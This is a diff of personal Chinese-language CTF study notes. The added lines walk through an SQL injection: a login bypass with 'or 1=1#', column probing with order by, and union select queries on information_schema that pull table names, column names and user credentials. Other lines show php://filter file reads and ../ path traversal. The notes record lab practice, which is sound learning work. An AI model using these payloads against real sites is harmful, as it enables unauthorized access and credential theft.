@@ -251,7 +251,15 @@ data://text/plain；base64，base64编码的代码#编码后传入绕过字符�
 4.网页一大堆乱码搜索ctf：ctrl+F
 2026.3.5
 1.登录问题 用户名直接输入admin'or 1=1#,密码填写1
-升级版登录：在1的基础上继续查：1'or 1=1 order by 3#
+升级版登录：在1的基础上继续查：1'or 1=1    ?username=1'order by 1%23...
+尝试到order by 4的时候网页报错，2，3是注入点，
+order by 4改成union select 1，2，3%23
+接下来union select 1,database(),3%23...得到数据库名geek
+database（）,group_concat(table_name) from information_schema.tables where table_schema=database()%23
+找到数据库名geekuser，l0ve1ysq1
+database（）,group_concat(column_name) from information_schema.columns where table_name='l0veysq1'%23
+得到 id,username,password
+database(),group_concat(id,username,password) from l0veysq1 %23...得到flag
 简单包含/include.php?test=phpinfo.php
 /?file=php://filter/convert.base64-encode/resource=flag.php查看flag
 warmup:目录层数：根目录.www.var.html(包含resource和hint),flag一般在根目录下面，返回四层目录../
